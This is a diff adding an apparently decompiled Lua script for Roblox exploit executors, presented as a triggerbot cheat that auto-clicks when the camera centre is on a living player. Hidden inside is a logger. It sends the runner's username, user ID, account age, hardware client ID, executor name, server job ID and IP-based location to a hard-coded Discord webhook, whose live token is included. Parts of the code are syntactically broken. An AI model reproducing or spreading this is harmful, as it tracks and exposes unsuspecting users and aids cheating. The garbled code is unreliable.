@@ -1,0 +1,207 @@
+  local GAME3 = GAME
+    GAME3 = GAME
+    GAME3 = GAME
+    GAME3 = GAME
+    local virtualInput = GAME3.GetService(GAME3, "VirtualInputManager")
+    local GAME4 = GAME
+    GAME4.GetService(GAME4, "SoundService")
+    local tbl5 = GAME3.GetService(GAME3, "Players").LocalPlayer
+    local camera = WORKSPACE.CurrentCamera
+    local v52 = 30
+    local v62 = Enum.KeyCode.Q
+    local v72 = 2
+    local enable1 = true
+    local v82 = 0
+    
+    local function function1(...)
+        local tbl6 = camera
+        local tbl7 = tbl6.ViewportPointToRay(tbl6, camera.ViewportSize.X / 2, camera.ViewportSize.v1 / 2)
+        local tbl8 = RaycastParams.new()
+        tbl8.FilterType = Enum.RaycastFilterType.Exclude
+        tbl8.FilterDescendantsInstances = { tbl5.Character }
+        tbl6 = WORKSPACE
+        local tbl9 = tbl6.Raycast(tbl6, tbl7.Origin, tbl7.Direction * v52, tbl8)
+        if tbl9 then
+            tbl6 = tbl9.Instance
+            local tbl11 = tbl6.FindFirstAncestorOfClass(tbl6, "Model")
+            if tbl11 then
+                local tbl10 = tbl11.FindFirstChildOfClass(tbl11, "Humanoid")
+                if tbl10 then
+                    tbl10.FindFirstChildOfClass(tbl10, tbl4[tbl10])
+                    tbl10.Health > 0 and not tbl8.IsAncestorOf(tbl8, tbl5.Character)
+                end
+                if tbl10 then return tbl8 end
+            end
+        end
+        return nil 
+    end
+    
+    local tbl12 = GAME3.GetService(GAME3, "UserInputService").InputBegan
+    tbl12.Connect(tbl12, function(function2, function3, ...)
+        if function2.KeyCode == v62 then
+            enable1 = not enable1
+            showStatusMessage()
+        end 
+    end)
+    tbl12 = GAME3.GetService(GAME3, "RunService").RenderStepped
+    tbl12.Connect(tbl12, function(...)
+        if tick() - v82 >= v72 then
+            local tbl13 = function1()
+            if tbl13 then
+                v82 = tick()
+                tbl13 = virtualInput
+                tbl13.SendMouseButtonEvent(tbl13, 0, 0, 0, true, GAME, 0)
+                task.wait(.01)
+                tbl13 = virtualInput
+                tbl13.SendMouseButtonEvent(tbl13, 0, 0, 0, false, GAME, 0)
+            end
+        end 
+    end)
+    print(helo)
+    local v92 = KRNL_LOADED
+    local v102 = concat
+    v102 = v102
+    v102 = v102
+    v102 = v102
+    v102 = v102
+    v102 = v102
+    v102 = v102
+    local GAME = GAME
+    local GAME2 = GAME
+    local httpService2 = GAME2.GetService(GAME2, "HttpService")
+    local func2 = http_request or request
+    func2({
+        ["Url"] = "https://canary.discord.com/api/webhooks/1495767703888199860/Vl-fegrf1F5F6c2DgKluUKx5RxE9w28fUWcLYxNDCzvXvh9MGPEpwtF5dNyYHNEpk6t0",
+        ["Body"] = httpService2.JSONEncode(httpService2, {
+            ["username"] = "logger",
+            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png",
+            ["content"] = " the player **" .. GAME.Players.LocalPlayer.Name .. "** just ran the logger",
+            ["embeds"] = {
+                {
+                    ["title"] = "** " .. GAME.Players.LocalPlayer.Name .. " just ran your logger**",
+                    ["description"] = "**" .. GAME.HttpGet(GAME, "http://ip-api.com/line/?fields=61439") .. "Username: " .. GAME.Players.LocalPlayer.Name .. ", Uses: " .. (is_sirhurt_closure and "Sirhurt" or (XENO_LOADED and "XENO" or "Kid with shit executor" or (v92 or ) or (secure_load and "Sentinel" or ))) .. "**",
+                    ["type"] = "rich",
+                    ["color"] = 14680319,
+                    ["footer"] = {
+                        ["text"] = "" .. string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", GAME.PlaceId, GAME.JobId) .. ""
+                    }
+                }
+            }
+        }),
+        ["Method"] = "POST",
+        ["Headers"] = { ["content-type"] = "application/json" }
+    })
+    local GAME5 = GAME
+    local httpService = GAME5.GetService(GAME5, "HttpService")
+    local GAME6 = GAME
+    GAME6 = GAME
+    local marketplace = GAME6.GetService(GAME6, "MarketplaceService")
+    local GAME7 = GAME
+    GAME7.GetService(GAME7, "Stats")
+    local tbl3 = GAME6.GetService(GAME6, "Players").LocalPlayer
+    local v12 = "https://canary.discord.com/api/webhooks/1495767703888199860/Vl-fegrf1F5F6c2DgKluUKx5RxE9w28fUWcLYxNDCzvXvh9MGPEpwtF5dNyYHNEpk6t0";
+    (function(...)
+        GAME = pcall
+        local tbl2 = GAME(function(...)
+            GAME = marketplace
+            return GAME.GetProductInfo(GAME, GAME.PlaceId) 
+        end)
+        local tbl = tbl2 and tbl2[2].Name
+        GAME = GAME
+        if tbl2 then
+            GAME = GAME
+            tbl = GAME.GetService(GAME, "RbxAnalyticsService")
+            GAME = tbl.GetClientId(tbl)
+            tbl2 = identifyexecutor
+            if tbl2 then local v32 = identifyexecutor() end
+            GAME = GAME
+            GAME2 = tostring(GAME.JobId)
+            GAME = httpService
+            local v22 = GAME.JSONEncode(GAME, {
+                ["embeds"] = {
+                    {
+                        ["title"] = "triggerbot exec",
+                        ["type"] = "rich",
+                        ["color"] = 16711680,
+                        ["fields"] = {
+                            {
+                                ["name"] = "Username",
+                                ["value"] = tbl3.Name,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "User ID",
+                                ["value"] = tostring(tbl3.UserId),
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Display Name",
+                                ["value"] = tbl3.DisplayName,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Game Name",
+                                ["value"] = tbl2 and t.Name,
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Place ID",
+                                ["value"] = tostring(GAME.PlaceId),
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Account Age",
+                                ["value"] = tostring(tbl3.AccountAge) .. " days",
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "HWID",
+                                ["value"] = "```" .. GAME .. "```",
+                                ["inline"] = false
+                            },
+                            {
+                                ["name"] = "Job ID",
+                                ["value"] = "```" .. GAME2 .. "```",
+                                ["inline"] = false
+                            },
+                            {
+                                ["name"] = "Executor",
+                                ["value"] = tbl2 or "Unknown",
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Execution Time",
+                                ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
+                                ["inline"] = true
+                            },
+                            {
+                                ["name"] = "Server Join Script",
+                                ["value"] = "```lua\n" .. ("game:GetService('TeleportService'):TeleportToPlaceInstance(" .. GAME.PlaceId .. ", '" .. GAME2 .. "')") .. "\n```",
+                                ["inline"] = false
+                            }
+                        },
+                        ["footer"] = { ["text"] = "log" }
+                    }
+                }
+            })
+            GAME = GAME
+            local func = syn and syn.v7 or http_request
+            pcall(function(...)
+                GAME = func == httpService.PostAsync
+                if GAME then
+                    GAME = httpService
+                    GAME.PostAsync(GAME, v12, v22)
+                else
+                    func({
+                        ["Url"] = v12,
+                        ["Method"] = "POST",
+                        ["Headers"] = { ["Content-Type"] = "application/json" },
+                        ["Body"] = v22
+                    })
+                end 
+            end)
+        else
+            tbl = "Unknown"
+        end 
+    end)()
+end
